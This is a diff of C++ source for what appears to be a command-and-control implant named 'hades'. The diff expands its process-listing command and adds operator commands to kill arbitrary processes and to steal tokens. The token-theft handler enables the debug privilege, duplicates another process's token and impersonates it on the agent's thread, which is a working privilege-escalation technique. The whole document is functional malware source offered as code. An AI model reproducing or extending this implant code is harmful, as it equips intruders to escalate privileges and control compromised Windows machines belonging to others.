@@ -23,8 +23,8 @@ BOOL commanders::Dispatch(PBYTE Data, UINT size, PBYTE OutBuffer) {
 		UINT CmdCode = g_ByteMgr->Read4();
 		switch (CmdCode)
 		{
-		case CMD_CODE_PS:
-			do_ps();
+		case CMD_CODE_PROC_LIST:
+			do_proc_list();
 			break;
 		case CMD_CODE_LS:
 			do_ls();
@@ -71,6 +71,10 @@ BOOL commanders::Dispatch(PBYTE Data, UINT size, PBYTE OutBuffer) {
 			break;
 		case CMD_CODE_RECONFIG:
 			do_reconfig();
+			break;
+		case CMD_CODE_PROC_KILL:
+			do_proc_kill();
+			break;
 		default:
 			break;
 		}
@@ -106,6 +110,8 @@ void commanders::do_download() {
 		Path = g_ByteMgr->ReadString(PathLen);
 		hFie = hades->WinApis.CreateFileA(Path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 		if (hFie == INVALID_HANDLE_VALUE) {
+			UINT Size = g_ByteMgr->Read4();
+			g_ByteMgr->Skip(Size);
 			g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
 			goto CLEANUP;
 		}
@@ -564,8 +570,8 @@ CLEANUP:
 }
 
 
-//
-void commanders::do_ps() {
+
+void commanders::do_proc_list() {
 	NTSTATUS stat;
 	ULONG size = 0;
 	PSYSTEM_PROCESS_INFORMATION spi = NULL;
@@ -574,18 +580,16 @@ void commanders::do_ps() {
 	HANDLE hProc = NULL;
 	HANDLE hToken = NULL;
 
-	CHAR NameBuf[256];
-	CHAR DomainBuf[256];
-	DWORD NameLen = 256;
-	DWORD DomainLen = 256;
+	PCHAR NameBuf = NULL;
+	PCHAR DomainBuf = NULL;;
+	DWORD NameLen = 0;
+	DWORD DomainLen = 0;
 
 	PBYTE buf = NULL;
 	DWORD needed = 0;
 	DWORD PID = 0;
 	INT len = 0;
 
-	const char* owner = "N/A";
-	DWORD ownerLen = 3;
 
 	g_ByteMgr->BeginTask();
 
@@ -608,10 +612,13 @@ void commanders::do_ps() {
 
 	g_ByteMgr->Write4(STATUS_OK);
 	g_ByteMgr->Write4(TASK_PS_LIST);
+
 	while (TRUE) {
 		CHAR line[512] = { 0 };
-		const char* owner = "N/A";
-		DWORD ownerLen = 3;
+		ULONG_PTR Wow = NULL;
+		BOOL Arch = 67;
+		
+
 		if (!spi->ImageName.Buffer) {
 			goto NEXT_ENTRY;
 		}
@@ -627,17 +634,30 @@ void commanders::do_ps() {
 			stat = hades->NtApis.NtOpenProcessToken(hProc, TOKEN_QUERY, &hToken);
 
 			if (NTAPI_SUCCESS(stat)) {
+				stat = hades->NtApis.NtQueryInformationProcess(hProc, ProcessWow64Information, &Wow, sizeof(ULONG_PTR), NULL);
+				if (NTAPI_SUCCESS(stat)) {
+					Arch = (Wow == 0);
+				}
+
 				hades->WinApis.GetTokenInformation(hToken, TokenUser, NULL, 0, &needed);
 				PTOKEN_USER tokenUsr = AllocMemory<TOKEN_USER>(needed);
 
 				if (hades->WinApis.GetTokenInformation(hToken, TokenUser, tokenUsr, needed, &needed)) {
 
 					SID_NAME_USE sidType;
-					if (hades->WinApis.LookupAccountSidA(NULL, tokenUsr->User.Sid, NameBuf, &NameLen, DomainBuf, &DomainLen, &sidType)) {
-						owner = NameBuf;
-						ownerLen = NameLen;
+					NameLen = 0;
+					DomainLen = 0;
+					hades->WinApis.LookupAccountSidA(NULL, tokenUsr->User.Sid, NULL, &NameLen, NULL, &DomainLen, &sidType);
+					NameBuf = AllocMemory<CHAR>(NameLen);
+					DomainBuf = AllocMemory<CHAR>(DomainLen);
 
+					if (NameBuf && DomainBuf) {
+						if (!hades->WinApis.LookupAccountSidA(NULL, tokenUsr->User.Sid, NameBuf, &NameLen, DomainBuf, &DomainLen, &sidType)) {
+							NameLen = 0;
+							DomainLen = 0;
+						}
 					}
+					
 				}
 				HeapFree(GetProcessHeap(), 0, tokenUsr);
 				hades->WinApis.CloseHandle(hToken);
@@ -648,9 +668,18 @@ void commanders::do_ps() {
 		// todo handle domain
 		g_ByteMgr->Write4(len);
 		g_ByteMgr->WriteString((PBYTE)line, len);
-		g_ByteMgr->Write4(ownerLen);
-		g_ByteMgr->WriteString((PBYTE)owner, ownerLen);
+		g_ByteMgr->Write4(NameLen);
+		if(NameLen > 0) g_ByteMgr->WriteString((PBYTE)NameBuf, NameLen);
+		g_ByteMgr->Write4(DomainLen);
+		if (NameLen > 0) g_ByteMgr->WriteString((PBYTE)DomainBuf, DomainLen);
 		g_ByteMgr->Write4(PID);
+		g_ByteMgr->Write4(spi->SessionId);
+		g_ByteMgr->Write4(Arch);
+
+		if (NameBuf) { HeapFree(GetProcessHeap(), 0, NameBuf); NameBuf = NULL; }
+		if (DomainBuf) { HeapFree(GetProcessHeap(), 0, DomainBuf); DomainBuf = NULL; }
+		NameLen = 0;
+		DomainLen = 0;
 
 
 	NEXT_ENTRY:
@@ -662,6 +691,112 @@ void commanders::do_ps() {
 CLEANUP:
 	if (buf) { HeapFree(GetProcessHeap(), 0, buf); }
 
+
+}
+
+
+void commanders::do_proc_kill() {
+	g_ByteMgr->BeginTask();
+
+	UINT PID = g_ByteMgr->Read4();
+
+	CLIENT_ID ci = { 0 };
+	OBJECT_ATTRIBUTES oa;
+	HANDLE hProc = NULL;
+	NTSTATUS Stat;
+
+	ci.UniqueProcess = (HANDLE)(ULONG_PTR)PID;
+	ci.UniqueThread = 0;
+
+	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
+	Stat = hades->NtApis.NtOpenProcess(&hProc, PROCESS_TERMINATE, &oa, &ci);
+	if (NTAPI_SUCCESS(Stat)) {
+		hades->NtApis.NtTerminateProcess(hProc, 0);
+		g_ByteMgr->EndOk(KILL_SUCCESS);
+	}
+	else {
+		ULONG Code = hades->NtApis.RtlNtStatusToDosError(Stat);
+		g_ByteMgr->EndErr(Code);
+	}
+
+	if (hProc) {
+		hades->WinApis.CloseHandle(hProc);
+	}
+
+
+}
+
+
+void commanders::do_steal_token() {
+	NTSTATUS Stat;
+	CLIENT_ID ci;
+	OBJECT_ATTRIBUTES oa;
+	OBJECT_ATTRIBUTES ImperOa = { sizeof(OBJECT_ATTRIBUTES) };
+	HANDLE hProc;
+	HANDLE hProcessToken;
+	
+	UINT TaskID = g_ByteMgr->BeginTask();
+
+	UINT PID = g_ByteMgr->Read4();
+	ci.UniqueProcess = (HANDLE)(ULONG_PTR)PID;
+	ci.UniqueThread = 0;
+
+	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
+
+	BOOLEAN Was;
+
+	Stat = hades->NtApis.RtlAdjustPrivilege(20, TRUE, FALSE, &Was);
+	if (!NTAPI_SUCCESS(Stat)) {
+		ULONG code = hades->NtApis.RtlNtStatusToDosError(Stat);
+		g_ByteMgr->EndErr(code);
+		return;
+
+	}
+
+	Stat = hades->NtApis.NtOpenProcess(&hProc, PROCESS_QUERY_INFORMATION, &oa, &ci);
+	if (!NTAPI_SUCCESS(Stat)) {
+		ULONG code = hades->NtApis.RtlNtStatusToDosError(Stat);
+		g_ByteMgr->EndErr(code);
+		return;
+	}
+
+	Stat = hades->NtApis.NtOpenProcessToken(hProc, TOKEN_DUPLICATE, &hProcessToken);
+	if (!NTAPI_SUCCESS(Stat)) {
+		ULONG code = hades->NtApis.RtlNtStatusToDosError(Stat);
+		g_ByteMgr->EndErr(code);
+		hades->WinApis.CloseHandle(hProc);
+		return;
+	}
+
+
+	HANDLE hImpersonationToken;
+	Stat = hades->NtApis.NtDuplicateToken(hProcessToken, TOKEN_QUERY | TOKEN_IMPERSONATE, &ImperOa, FALSE, TokenImpersonation, &hImpersonationToken);
+	if (!NTAPI_SUCCESS(Stat)) {
+		ULONG code = hades->NtApis.RtlNtStatusToDosError(Stat);
+		g_ByteMgr->EndErr(code);
+		hades->WinApis.CloseHandle(hProc);
+		hades->WinApis.CloseHandle(hProcessToken);
+		return;
+	}
+
+	//g_TokenMgr->InsertToken(hImpersonationToken, TaskID, PID);
+
+	HANDLE cur = (HANDLE)-2;
+	Stat = hades->NtApis.NtSetInformationThread(cur, (THREADINFOCLASS)5, &hImpersonationToken, sizeof(HANDLE));
+	if (!NTAPI_SUCCESS(Stat)) {
+		ULONG code = hades->NtApis.RtlNtStatusToDosError(Stat);
+		g_ByteMgr->EndErr(code);
+		hades->WinApis.CloseHandle(hProc);
+		hades->WinApis.CloseHandle(hProcessToken);
+		hades->WinApis.CloseHandle(hImpersonationToken);
+		return;
+	}
+
+	hades->WinApis.CloseHandle(hImpersonationToken);
+	hades->WinApis.CloseHandle(hProc);
+	hades->WinApis.CloseHandle(hProcessToken);
+	
+	g_ByteMgr->EndOk(STEAL_SUCCESS);
 
 }
 
